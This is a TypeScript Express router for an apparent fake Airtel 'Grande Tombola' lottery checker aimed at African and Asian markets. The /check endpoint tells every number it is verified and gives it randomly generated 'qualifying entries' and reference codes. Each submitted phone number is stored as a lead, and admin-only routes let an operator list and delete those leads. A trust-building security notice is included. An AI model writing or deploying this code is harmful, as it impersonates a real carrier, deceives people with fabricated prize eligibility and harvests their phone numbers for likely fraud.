import { Router, Request, Response } from 'express';
import { db } from '../db.js';
import { requireAuth } from '../middleware/auth.js';

const router = Router();

// Country prefixes & telecom carriers across all Airtel markets (including DRC & Congo-Brazzaville)
const AIRTEL_MARKETS: Record<string, { code: string; name: string; currency: string; rateToUSD: number }> = {
  // Africa (14 Markets)
  CD: { code: '+243', name: 'RD Congo (RDC)', currency: 'USD', rateToUSD: 1 },
  CG: { code: '+242', name: 'Congo (Brazzaville)', currency: 'XAF', rateToUSD: 600 },
  KE: { code: '+254', name: 'Kenya', currency: 'KES', rateToUSD: 130 },
  NG: { code: '+234', name: 'Nigeria', currency: 'NGN', rateToUSD: 1450 },
  UG: { code: '+256', name: 'Ouganda', currency: 'UGX', rateToUSD: 3700 },
  TZ: { code: '+255', name: 'Tanzanie', currency: 'TZS', rateToUSD: 2650 },
  ZM: { code: '+260', name: 'Zambie', currency: 'ZMW', rateToUSD: 27 },
  RW: { code: '+250', name: 'Rwanda', currency: 'RWF', rateToUSD: 1350 },
  MW: { code: '+265', name: 'Malawi', currency: 'MWK', rateToUSD: 1750 },
  MG: { code: '+261', name: 'Madagascar', currency: 'MGA', rateToUSD: 4500 },
  GA: { code: '+241', name: 'Gabon', currency: 'XAF', rateToUSD: 600 },
  TD: { code: '+235', name: 'Tchad', currency: 'XAF', rateToUSD: 600 },
  NE: { code: '+227', name: 'Niger', currency: 'XOF', rateToUSD: 600 },
  SC: { code: '+248', name: 'Seychelles', currency: 'SCR', rateToUSD: 14 },
  // Asia
  IN: { code: '+91', name: 'Inde', currency: 'INR', rateToUSD: 85 },
  LK: { code: '+94', name: 'Sri Lanka', currency: 'LKR', rateToUSD: 300 },
  BD: { code: '+880', name: 'Bangladesh', currency: 'BDT', rateToUSD: 120 },
};

router.post('/check', (req: Request, res: Response) => {
  try {
    const { phone, countryCode } = req.body;

    if (!phone) {
      return res.status(400).json({ success: false, message: 'Veuillez fournir un numéro mobile Airtel valide.' });
    }

    const cleanPhone = phone.replace(/[^0-9+]/g, '');
    if (cleanPhone.length < 8) {
      return res.status(400).json({ success: false, message: 'Numéro mobile trop court. Veuillez vérifier votre numéro Airtel.' });
    }

    const marketKey = countryCode && AIRTEL_MARKETS[countryCode.toUpperCase()] ? countryCode.toUpperCase() : 'CD';
    const market = AIRTEL_MARKETS[marketKey];

    // Generate authenticated entry token & qualifying count
    const refCode = `AIRTEL-${marketKey}-${Math.floor(100000 + Math.random() * 900000)}`;
    const qualifyingEntries = Math.floor(2 + Math.random() * 5); // 2 to 6 entries

    // Record subscriber lead into database so admin can view
    db.addSubscriber(cleanPhone, market.name, marketKey, req.body.category || "Vérification d'éligibilité", 'entry_checker');

    return res.json({
      success: true,
      eligible: true,
      status: 'Actif & Vérifié',
      phone: cleanPhone,
      country: market.name,
      currency: market.currency,
      qualifyingEntries,
      referenceCode: refCode,
      message: `Votre ligne Airtel est active et vérifiée pour la Grande Tombola Cash de Décembre 2026. Vous possédez ${qualifyingEntries} participations validées enregistrées pour les tirages Quotidiens, Hebdomadaires et du Grand Prix de Noël !`,
      securityNotice: 'Airtel ne vous demandera JAMAIS votre code secret PIN Airtel Money, mot de passe ou code de validation reçu par SMS (OTP).'
    });
  } catch (error) {
    console.error('Check entry error:', error);
    return res.status(500).json({ success: false, message: "Échec du traitement de la vérification d'éligibilité." });
  }
});

// Get conversion rates for USD to local currencies
router.get('/markets', (_req, res) => {
  res.json({
    success: true,
    markets: AIRTEL_MARKETS
  });
});

// Record explicit subscriber entry from "Explore Rewards" prompt
router.post('/register', (req: Request, res: Response) => {
  try {
    const { phone, countryCode, category } = req.body;
    if (!phone) {
      return res.status(400).json({ success: false, message: 'Veuillez fournir un numéro mobile Airtel valide.' });
    }
    const cleanPhone = phone.replace(/[^0-9+]/g, '');
    if (cleanPhone.length < 8) {
      return res.status(400).json({ success: false, message: 'Numéro mobile trop court. Veuillez vérifier votre numéro.' });
    }
    const marketKey = countryCode && AIRTEL_MARKETS[countryCode.toUpperCase()] ? countryCode.toUpperCase() : 'CD';
    const market = AIRTEL_MARKETS[marketKey];

    const lead = db.addSubscriber(cleanPhone, market.name, marketKey, category || 'Toutes les catégories de prix', 'explore_rewards_prompt');

    return res.json({
      success: true,
      message: 'Numéro mobile enregistré avec succès pour les alertes de récompenses cash.',
      subscriber: lead
    });
  } catch (error) {
    console.error('Register subscriber error:', error);
    return res.status(500).json({ success: false, message: 'Server error saving subscriber.' });
  }
});

// Admin-only: Get all captured subscribers
router.get('/subscribers', requireAuth, (_req: Request, res: Response) => {
  try {
    const subscribers = db.getSubscribers();
    return res.json({ success: true, subscribers });
  } catch (error) {
    console.error('Fetch subscribers error:', error);
    return res.status(500).json({ success: false, message: 'Failed to fetch subscribers.' });
  }
});

// Admin-only: Delete a subscriber
router.delete('/subscribers/:id', requireAuth, (req: Request, res: Response) => {
  try {
    const { id } = req.params;
    const ok = db.deleteSubscriber(id as string);
    return res.json({ success: ok, message: ok ? 'Subscriber deleted' : 'Subscriber not found' });
  } catch (error) {
    console.error('Delete subscriber error:', error);
    return res.status(500).json({ success: false, message: 'Failed to delete subscriber.' });
  }
});

export default router;

